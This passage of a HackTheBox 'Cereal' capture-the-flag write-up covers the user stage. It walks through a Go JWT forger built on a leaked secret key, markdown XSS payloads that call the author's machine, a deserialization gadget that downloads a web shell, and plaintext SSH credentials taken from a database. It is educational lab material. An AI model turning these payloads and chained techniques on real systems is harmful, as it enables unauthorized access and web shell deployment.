</span></span><span class=line><span class=cl><span class=kr>import</span> <span class=p>{</span> <span class=nx>authenticationService</span> <span class=p>}</span> <span class=nx>from</span> <span class=s1>&#39;../_services&#39;</span><span class=p>;</span> <span class=c1>// &lt;==
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=kr>class</span> <span class=nx>LoginPage</span> <span class=kr>extends</span> <span class=nx>React</span><span class=p>.</span><span class=nx>Component</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>constructor</span><span class=p>(</span><span class=nx>props</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kr>super</span><span class=p>(</span><span class=nx>props</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>// redirect to home if already logged in
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>if</span> <span class=p>(</span><span class=nx>authenticationService</span><span class=p>.</span><span class=nx>currentUserValue</span><span class=p>)</span> <span class=p>{</span>  <span class=c1>// &lt;==
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=k>this</span><span class=p>.</span><span class=nx>props</span><span class=p>.</span><span class=nx>history</span><span class=p>.</span><span class=nx>push</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>);</span> 
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>render</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=o>&lt;</span><span class=nx>div</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>                <span class=o>&lt;</span><span class=nx>h2</span><span class=o>&gt;</span><span class=nx>Login</span><span class=o>&lt;</span><span class=err>/h2&gt;</span>
</span></span><span class=line><span class=cl><span class=p>...</span><span class=o>&lt;</span><span class=nx>SNIP</span><span class=o>&gt;</span><span class=p>...</span>
</span></span></code></pre></div><p>I could track the <code>authenticationService.currentUserValue</code> and it is defined in <code>ClientApp/src/_services/authentication.service.jsx</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kr>const</span> <span class=nx>currentUserSubject</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>BehaviorSubject</span><span class=p>(</span><span class=nx>JSON</span><span class=p>.</span><span class=nx>parse</span><span class=p>(</span><span class=nx>localStorage</span><span class=p>.</span><span class=nx>getItem</span><span class=p>(</span><span class=s1>&#39;currentUser&#39;</span><span class=p>)));</span> <span class=c1>// &lt;==
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=kr>export</span> <span class=kr>const</span> <span class=nx>authenticationService</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>login</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nx>logout</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nx>currentUser</span><span class=o>:</span> <span class=nx>currentUserSubject</span><span class=p>.</span><span class=nx>asObservable</span><span class=p>(),</span><span class=c1>// &lt;==
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nx>get</span> <span class=nx>currentUserValue</span> <span class=p>()</span> <span class=p>{</span> <span class=k>return</span> <span class=nx>currentUserSubject</span><span class=p>.</span><span class=nx>value</span> <span class=p>}</span> <span class=c1>// &lt;==
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>};</span>
</span></span></code></pre></div><h3 id=authentication-bypass>Authentication Bypass<a class=anchor aria-hidden=true href=#authentication-bypass>#</a></h3><p>I could summarize the previous code analysis to these points:</p><ul><li>As long as the browser&rsquo;s local storage contains a key of <code>currentUser</code> which has JWT token in its value, the client app will logs the user in.</li><li>No other validation in JWT token except the user&rsquo;s ID and expires date. (based on <code>Services/UserService.cs</code>)</li><li>Based on <code>Models/User.cs</code>, <code>Services/UserService.cs</code>, and <code>ClientApp/src/_services/auth-header.js</code> , the form of <code>currentUser</code> is something like this:<ul><li><code>"currentUser" : "{ "userId": "0", "username": "name", "token": "JWT token"}"</code>.</li></ul></li></ul><p>And here are the tactics to bypass the login page:</p><ul><li>Since there is no validation on the issuer, and I have the JWT secret key, I could forge my own JWT.</li><li>I&rsquo;ll put the forged JWT token to browser&rsquo;s local storage of <code>cereal.htb</code> with the key name of <code>currentUser</code>.</li><li>Simply refresh the page afterwards and see if it logs me in.</li></ul><h4 id=forge-jwt>Forge JWT<a class=anchor aria-hidden=true href=#forge-jwt>#</a></h4><p>To forge our own JWT, you could try <a href=https://github.com/ticarpi/jwt_tool>jwtool</a>, but I tried to forge my own JWT using Golang. Here is the code:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class=line><span class=cl><span class=kn>package</span> <span class=nx>main</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;encoding/json&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;fmt&#34;</span>
</span></span><span class=line><span class=cl>	<span class=s>&#34;time&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=s>&#34;github.com/dgrijalva/jwt-go&#34;</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>type</span> <span class=nx>UserService</span> <span class=kd>interface</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nf>CreateToken</span><span class=p>(</span><span class=nx>userID</span> <span class=kt>string</span><span class=p>)</span> <span class=kt>string</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>type</span> <span class=nx>jwtService</span> <span class=kd>struct</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nx>secretKey</span> <span class=kt>string</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>func</span> <span class=p>(</span><span class=nx>s</span> <span class=o>*</span><span class=nx>jwtService</span><span class=p>)</span> <span class=nf>CreateToken</span><span class=p>()</span> <span class=kt>string</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nx>claims</span> <span class=o>:=</span> <span class=nx>jwt</span><span class=p>.</span><span class=nx>StandardClaims</span><span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>ExpiresAt</span><span class=p>:</span> <span class=nx>time</span><span class=p>.</span><span class=nf>Now</span><span class=p>().</span><span class=nf>AddDate</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>7</span><span class=p>).</span><span class=nf>UTC</span><span class=p>().</span><span class=nf>Unix</span><span class=p>(),</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nx>token</span> <span class=o>:=</span> <span class=nx>jwt</span><span class=p>.</span><span class=nf>NewWithClaims</span><span class=p>(</span><span class=nx>jwt</span><span class=p>.</span><span class=nx>SigningMethodHS256</span><span class=p>,</span> <span class=nx>claims</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>t</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>token</span><span class=p>.</span><span class=nf>SignedString</span><span class=p>([]</span><span class=nb>byte</span><span class=p>(</span><span class=nx>s</span><span class=p>.</span><span class=nx>secretKey</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nb>panic</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=nx>t</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>type</span> <span class=nx>User</span> <span class=kd>struct</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nx>UserId</span>   <span class=kt>string</span> <span class=s>`json:&#34;userId,omitempty&#34;`</span>
</span></span><span class=line><span class=cl>	<span class=nx>Username</span> <span class=kt>string</span> <span class=s>`json:&#34;username,omitempty&#34;`</span>
</span></span><span class=line><span class=cl>	<span class=nx>Token</span>    <span class=kt>string</span> <span class=s>`json:&#34;token,omitempty&#34;`</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>func</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nx>jwt</span> <span class=o>:=</span> <span class=o>&amp;</span><span class=nx>jwtService</span><span class=p>{}</span>
</span></span><span class=line><span class=cl>	<span class=nx>jwt</span><span class=p>.</span><span class=nx>secretKey</span> <span class=p>=</span> <span class=s>&#34;secretlhfIH&amp;FY*#oysuflkhskjfhefesf&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nx>cu</span> <span class=o>:=</span> <span class=nx>User</span><span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>UserId</span><span class=p>:</span>   <span class=s>&#34;1&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=nx>Username</span><span class=p>:</span> <span class=s>&#34;iamf&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>		<span class=nx>Token</span><span class=p>:</span>    <span class=nx>jwt</span><span class=p>.</span><span class=nf>CreateToken</span><span class=p>(),</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nx>currentUser</span><span class=p>,</span> <span class=nx>_</span> <span class=o>:=</span> <span class=nx>json</span><span class=p>.</span><span class=nf>Marshal</span><span class=p>(</span><span class=nx>cu</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>fmt</span><span class=p>.</span><span class=nf>Printf</span><span class=p>(</span><span class=s>&#34;%s&#34;</span><span class=p>,</span> <span class=nx>currentUser</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>It produces the following output.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>→ root@kali «cereal» «10.10.14.3»
</span></span><span class=line><span class=cl>$ go run main.go
</span></span><span class=line><span class=cl><span class=o>{</span><span class=s2>&#34;userId&#34;</span>:<span class=s2>&#34;1&#34;</span>,<span class=s2>&#34;username&#34;</span>:<span class=s2>&#34;iamf&#34;</span>,<span class=s2>&#34;token&#34;</span>:<span class=s2>&#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2MjM4MTgwMzh9.XAcgRqhpgyJARsBMEWg1UOlUeRnQU4bvbk1SpAv3vDM&#34;</span><span class=o>}</span>
</span></span></code></pre></div><h4 id=login>Login<a class=anchor aria-hidden=true href=#login>#</a></h4><p>At <code>https://cereal.htb</code>, I&rsquo;ll create a new local storage with a key name of <code>currentUser</code> and I&rsquo;ll put the previous output as the key&rsquo;s value. When I refresh the site, it logs me in.</p><p><div class=img-container><img src=imgs/image-20210609113605143.png alt=image-20210609113605143></div></p><h4 id=input-testing>Input testing<a class=anchor aria-hidden=true href=#input-testing>#</a></h4><p>When I submitted a URL which points to my attacking machine, I received a GET request coming from the Title field.</p><p><div class=img-container><img src=imgs/image-20210605163056142.png alt=image-20210605163056142></div></p><p>Here how the request and the response looklike.</p><p><div class=img-container><img src=imgs/image-20210605183457568.png alt=image-20210605183457568></div></p><h3 id=source--code-analysis-2>Source Code Analysis #2<a class=anchor aria-hidden=true href=#source--code-analysis-2>#</a></h3><blockquote><p>I decided to mix it with images hehe.</p></blockquote><h4 id=deserialization-vulnerability>Deserialization Vulnerability<a class=anchor aria-hidden=true href=#deserialization-vulnerability>#</a></h4><p>Looking into the request controller, <code>Controllers/RequestsController.cs</code>, it turns out that each Cereal Request (POST) sent is saved in database without validation.</p><p><div class=img-container><img src=imgs/image-20210609115652148.png alt=image-20210609115652148></div></p><p>Actually, there is a client-side validation, but it could easily be bypassed with Burp repeater. For example, I could send a cereal request in different structure:</p><p><div class=img-container><img src=imgs/image-20210609122743196.png alt=image-20210609122743196></div></p><p>The cereal database&rsquo;s name can be found inside <code>CerealContext.cs</code>.</p><p><div class=img-container><img src=imgs/image-20210609120019771.png alt=image-20210609120019771></div></p><p>Looking back into the request controller, there is a comment inside the <code>Get</code> function that points out about deserialization (previously seen upon comparing the commit logs):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-csharp data-lang=csharp><span class=line><span class=cl><span class=p>...&lt;</span><span class=n>SNIP</span><span class=p>&gt;...</span>
</span></span><span class=line><span class=cl><span class=na>        [Authorize(Policy = &#34;RestrictIP&#34;)]</span>
</span></span><span class=line><span class=cl><span class=na>        [HttpGet(&#34;{id}&#34;)]</span>
</span></span><span class=line><span class=cl>        <span class=k>public</span> <span class=n>IActionResult</span> <span class=n>Get</span><span class=p>(</span><span class=kt>int</span> <span class=n>id</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>using</span> <span class=p>(</span><span class=kt>var</span> <span class=n>db</span> <span class=p>=</span> <span class=k>new</span> <span class=n>CerealContext</span><span class=p>())</span>
</span></span><span class=line><span class=cl>            <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=kt>string</span> <span class=n>json</span> <span class=p>=</span> <span class=n>db</span><span class=p>.</span><span class=n>Requests</span><span class=p>.</span><span class=n>Where</span><span class=p>(</span><span class=n>x</span> <span class=p>=&gt;</span> <span class=n>x</span><span class=p>.</span><span class=n>RequestId</span> <span class=p>==</span> <span class=n>id</span><span class=p>).</span><span class=n>SingleOrDefault</span><span class=p>().</span><span class=n>JSON</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=c1>// Filter to prevent deserialization attacks mentioned here: https://github.com/pwntester/ysoserial.net/tree/master/ysoserial</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=n>json</span><span class=p>.</span><span class=n>ToLower</span><span class=p>().</span><span class=n>Contains</span><span class=p>(</span><span class=s>&#34;objectdataprovider&#34;</span><span class=p>)</span> <span class=p>||</span> <span class=n>json</span><span class=p>.</span><span class=n>ToLower</span><span class=p>().</span><span class=n>Contains</span><span class=p>(</span><span class=s>&#34;windowsidentity&#34;</span><span class=p>)</span> <span class=p>||</span> <span class=n>json</span><span class=p>.</span><span class=n>ToLower</span><span class=p>().</span><span class=n>Contains</span><span class=p>(</span><span class=s>&#34;system&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>                <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=k>return</span> <span class=n>BadRequest</span><span class=p>(</span><span class=k>new</span> <span class=p>{</span> <span class=n>message</span> <span class=p>=</span> <span class=s>&#34;The cereal police have been dispatched.&#34;</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>                <span class=kt>var</span> <span class=n>cereal</span> <span class=p>=</span> <span class=n>JsonConvert</span><span class=p>.</span><span class=n>DeserializeObject</span><span class=p>(</span><span class=n>json</span><span class=p>,</span> <span class=k>new</span> <span class=n>JsonSerializerSettings</span>
</span></span><span class=line><span class=cl>                <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=n>TypeNameHandling</span> <span class=p>=</span> <span class=n>TypeNameHandling</span><span class=p>.</span><span class=n>Auto</span>
</span></span><span class=line><span class=cl>                <span class=p>});</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>Ok</span><span class=p>(</span><span class=n>cereal</span><span class=p>.</span><span class=n>ToString</span><span class=p>());</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span></code></pre></div><p>The <code>Get</code> function can only be accessed if the request IP is in the whitelist (defined in <code>appsettings.json</code> ) and it takes one parameter called <code>id</code> (GET <code>/requests/{id}</code>).</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-csharp data-lang=csharp><span class=line><span class=cl><span class=na>[Authorize(Policy = &#34;RestrictIP&#34;)]</span>
</span></span><span class=line><span class=cl><span class=na>[HttpGet(&#34;{id}&#34;)]</span>
</span></span></code></pre></div><p>This line blocks the gadget classes used for .NET deserialization attack.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=k>if</span> <span class=o>(</span>json.ToLower<span class=o>()</span>.Contains<span class=o>(</span><span class=s2>&#34;objectdataprovider&#34;</span><span class=o>)</span> <span class=o>||</span> json.ToLower<span class=o>()</span>.Contains<span class=o>(</span><span class=s2>&#34;windowsidentity&#34;</span><span class=o>)</span> <span class=o>||</span> json.ToLower<span class=o>()</span>.Contains<span class=o>(</span><span class=s2>&#34;system&#34;</span><span class=o>))</span>
</span></span></code></pre></div><p>But, there is a class called <code>DownloadHelper</code> that has a function which can be used to send a download request:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-csharp data-lang=csharp><span class=line><span class=cl><span class=p>...&lt;</span><span class=n>SNIP</span><span class=p>&gt;...</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>class</span> <span class=nc>DownloadHelper</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>private</span> <span class=n>String</span> <span class=n>_URL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>private</span> <span class=n>String</span> <span class=n>_FilePath</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>public</span> <span class=n>String</span> <span class=n>URL</span>
</span></span><span class=line><span class=cl><span class=p>...&lt;</span><span class=n>SNIP</span><span class=p>&gt;...</span>
</span></span><span class=line><span class=cl>        <span class=k>private</span> <span class=k>void</span> <span class=n>Download</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>using</span> <span class=p>(</span><span class=n>WebClient</span> <span class=n>wc</span> <span class=p>=</span> <span class=k>new</span> <span class=n>WebClient</span><span class=p>())</span>
</span></span><span class=line><span class=cl>            <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(!</span><span class=kt>string</span><span class=p>.</span><span class=n>IsNullOrEmpty</span><span class=p>(</span><span class=n>_URL</span><span class=p>)</span> <span class=p>&amp;&amp;</span> <span class=p>!</span><span class=kt>string</span><span class=p>.</span><span class=n>IsNullOrEmpty</span><span class=p>(</span><span class=n>_FilePath</span><span class=p>))</span>
</span></span><span class=line><span class=cl>                <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=n>wc</span><span class=p>.</span><span class=n>DownloadFile</span><span class=p>(</span><span class=n>_URL</span><span class=p>,</span> <span class=n>ReplaceLastOccurrence</span><span class=p>(</span><span class=n>_FilePath</span><span class=p>,</span><span class=s>&#34;\\&#34;</span><span class=p>,</span> <span class=s>&#34;\\21098374243-&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span></code></pre></div><p>I could use <code>DownloadHelper</code> class to download a web shell hosted on my machine by sending a serialized form of this class via the Cereal Request.</p><p>The problem here I couldn&rsquo;t make a GET request to <code>requests/{id}</code> because there is an IP restriction policy.</p><h4 id=xss-vulnerability>XSS Vulnerability<a class=anchor aria-hidden=true href=#xss-vulnerability>#</a></h4><p>When tracking down where the previous GET request came from, I found out that each Cereal Request sent lands on the admin page (<code>AdminPage.jsx</code>).</p><p><div class=img-container><img src=imgs/image-20210609114906150.png alt=image-20210609114906150></div></p><p>And one of the app library used in the admin page called <code>react-marked-down</code> has an <a href=https://hackerone.com/reports/344069>XSS vulnerability</a>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=p>...</span><span class=o>&lt;</span><span class=nx>SNIP</span><span class=o>&gt;</span><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=nx>Accordion</span><span class=p>.</span><span class=nx>Toggle</span> <span class=nx>as</span><span class=o>=</span><span class=p>{</span><span class=nx>Button</span><span class=p>}</span> <span class=nx>variant</span><span class=o>=</span><span class=s2>&#34;link&#34;</span> <span class=nx>eventKey</span><span class=o>=</span><span class=p>{</span><span class=k>this</span><span class=p>.</span><span class=nx>props</span><span class=p>.</span><span class=nx>request</span><span class=p>.</span><span class=nx>requestId</span><span class=p>}</span> <span class=nx>name</span><span class=o>=</span><span class=s2>&#34;expand&#34;</span> <span class=nx>id</span><span class=o>=</span><span class=p>{</span><span class=k>this</span><span class=p>.</span><span class=nx>props</span><span class=p>.</span><span class=nx>request</span><span class=p>.</span><span class=nx>requestId</span><span class=p>}</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span><span class=nx>requestData</span> <span class=o>&amp;&amp;</span> <span class=nx>requestData</span><span class=p>.</span><span class=nx>title</span> <span class=o>&amp;&amp;</span> <span class=k>typeof</span> <span class=nx>requestData</span><span class=p>.</span><span class=nx>title</span> <span class=o>==</span> <span class=s1>&#39;string&#39;</span> <span class=o>&amp;&amp;</span> 
</span></span><span class=line><span class=cl>        <span class=o>&lt;</span><span class=nx>MarkdownPreview</span> <span class=nx>markedOptions</span><span class=o>=</span><span class=p>{{</span> <span class=nx>sanitize</span><span class=o>:</span> <span class=kc>true</span> <span class=p>}}</span> <span class=nx>value</span><span class=o>=</span><span class=p>{</span><span class=nx>requestData</span><span class=p>.</span><span class=nx>title</span><span class=p>}</span> <span class=o>/&gt;</span> <span class=c1>// &lt;==
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>...</span><span class=o>&lt;</span><span class=nx>SNIP</span><span class=o>&gt;</span><span class=p>...</span>
</span></span></code></pre></div><p>I could confirm the vulnerability with the following payload:</p><pre tabindex=0><code>[XSS](javascript: document.write`&lt;img src=&#39;http://10.10.14.3/iamf&#39;/&gt;`)
</code></pre><p><div class=img-container><img src=imgs/image-20210605212246743.png alt=image-20210605212246743></div></p><p>With a few experiments, URL encoding seems to work as well</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-markdown data-lang=markdown><span class=line><span class=cl>[<span class=nt>XSS</span>](<span class=na>javascript: document.write%28%22&lt;img src=&#39;http://10.10.14.3/iamf&#39;&gt;%22%29</span>)
</span></span></code></pre></div><h2 id=foothold>Foothold<a class=anchor aria-hidden=true href=#foothold>#</a></h2><h3 id=shell-as-sonny>Shell as Sonny<a class=anchor aria-hidden=true href=#shell-as-sonny>#</a></h3><h4 id=web-shell-upload-via-xss-and-deserialization>Web Shell Upload via XSS and Deserialization<a class=anchor aria-hidden=true href=#web-shell-upload-via-xss-and-deserialization>#</a></h4><p>Putting it all together:</p><ul><li>There is an uploads directory at <code>https://source.cereal.htb/uploads/</code>.</li><li>The gadget classes for deserialization attack are filtered, but there is one class called <code>DownloadHelper</code> that can be accessed and it has a download function.</li><li>There is a SSRF (not sure yet) in the Title section, which can be used along with the XSS vulnerability to bypass the IP restriction.</li></ul><p>The tactics:</p><ul><li><a href="https://speakerdeck.com/pwntester/attacking-net-serialization?slide=25">Serialized</a> <code>DownloadHelper</code> class which contains a web shell URL that points to the attacking machine, and send it via the Cereal Request, note the ID.</li><li>Use XSS which bypasses the IP restriction, to make a GET request to <code>cereal.htb/request/{the ID}</code> to trigger the deserialization,</li><li>Confirms the web shell at <code>https://cereal.source.htb/uploads/shell-name.aspx</code></li></ul><p>I&rsquo;ve made a <a href=https://gist.github.com/fahmifj/c935b12c4b0a66ee30a7aa825d3c7fe1>script</a> to chain these vulnerabilities (XSS, SSRF, and Deserialization). The results is as follow:</p><p><div class=img-container><img src=imgs/image-20210609125605658.png alt=image-20210609125605658></div></p><blockquote><p>That&rsquo;s on different IP because I decided to ran the exploit again to make sure it&rsquo;s still work XD</p></blockquote><p>I can access my web shell on <code>http://source.cereal.htb/uploads/iamf.aspx</code>.</p><p><div class=img-container><img src=imgs/image-20210609125710180.png alt=image-20210609125710180></div></p><h4 id=ssh---sonny>SSH - sonny<a class=anchor aria-hidden=true href=#ssh---sonny>#</a></h4><p>A quick check on the web directory, I find the <code>cereal.db</code> at <code>c:\inetpub\cereal\db\cereal.db</code> and it contains a string that looks like a set of credentials.</p><p><div class=img-container><img src=imgs/image-20210609133307066.png alt=image-20210609133307066></div></p><p>I tried it on SSH (<code>sonny:mutual.madden.manner38974</code>) and it worked.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «exploits» «10.10.14.2» 
</span></span><span class=line><span class=cl>$ ssh sonny@cereal.htb
</span></span><span class=line><span class=cl>sonny@cereal.htb<span class=err>&#39;</span>s password: 
</span></span><span class=line><span class=cl>Microsoft Windows <span class=o>[</span>Version 10.0.17763.1817<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>(</span>c<span class=o>)</span> <span class=m>2018</span> Microsoft Corporation. All rights reserved.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>sonny@CEREAL C:<span class=se>\U</span>sers<span class=se>\s</span>onny&gt;dir desktop<span class=se>\ </span>
</span></span><span class=line><span class=cl> Volume in drive C has no label.                   
</span></span><span class=line><span class=cl> Volume Serial Number is C4EF-2153                 
</span></span><span class=line><span class=cl>                                                   
</span></span><span class=line><span class=cl> Directory of C:<span class=se>\U</span>sers<span class=se>\s</span>onny<span class=se>\d</span>esktop               
</span></span><span class=line><span class=cl>                                                   
</span></span><span class=line><span class=cl>11/16/2020  05:19 AM    &lt;DIR&gt;          .           
</span></span><span class=line><span class=cl>11/16/2020  05:19 AM    &lt;DIR&gt;          ..          
</span></span><span class=line><span class=cl>06/07/2021  09:59 PM                <span class=m>34</span> user.txt    
</span></span><span class=line><span class=cl>               <span class=m>1</span> File<span class=o>(</span>s<span class=o>)</span>             <span class=m>34</span> bytes      
</span></span><span class=line><span class=cl>               <span class=m>2</span> Dir<span class=o>(</span>s<span class=o>)</span>   7,621,619,712 bytes free 
</span></span></code></pre></div><div class=post-references><h2>References</h2><ul><li><a href=https://curity.io/resources/learn/jwt-best-practices/#4-always-check-the-issuer target=_blank rel="noopener noreferrer">https://curity.io/resources/learn/jwt-best-practices/#4-always-check-the-issuer</a></li><li><a href="https://docs.microsoft.com/en-us/dotnet/standard/serialization/system-text-json-how-to?pivots=dotnet-5-0" target=_blank rel="noopener noreferrer">https://docs.microsoft.com/en-us/dotnet/standard/serialization/system-text-json-how-to?pivots=dotnet-5-0</a></li><li><a href=https://stackoverflow.com/questions/40898632/parentheses-alternatives-in-js-if-any target=_blank rel="noopener noreferrer">https://stackoverflow.com/questions/40898632/parentheses-alternatives-in-js-if-any</a></li></ul></div></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://fahmifj.github.io/tags/windows/>Windows</a></li><li><a href=https://fahmifj.github.io/tags/recover-git/>Recover-git</a></li><li><a href=https://fahmifj.github.io/tags/dotnet/>dotNET</a></li><li><a href=https://fahmifj.github.io/tags/csharp/>Csharp</a></li><li><a href=https://fahmifj.github.io/tags/code-review/>Code-review</a></li><li><a href=https://fahmifj.github.io/tags/jwt/>JWT</a></li><li><a href=https://fahmifj.github.io/tags/golang/>Golang</a></li><li><a href=https://fahmifj.github.io/tags/deserialization/>Deserialization</a></li><li><a href=https://fahmifj.github.io/tags/xss/>XSS</a></li><li><a href=https://fahmifj.github.io/tags/python/>Python</a></li></ul><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Cereal (User) on twitter" href="https://twitter.com/intent/tweet/?text=HackTheBox%20-%20Cereal%20%28User%29&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fcereal%2f&hashtags=Windows%2cRecover-git%2cdotNET%2cCsharp%2cCode-review%2cJWT%2cGolang%2cDeserialization%2cXSS%2cPython"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Cereal (User) on linkedin" 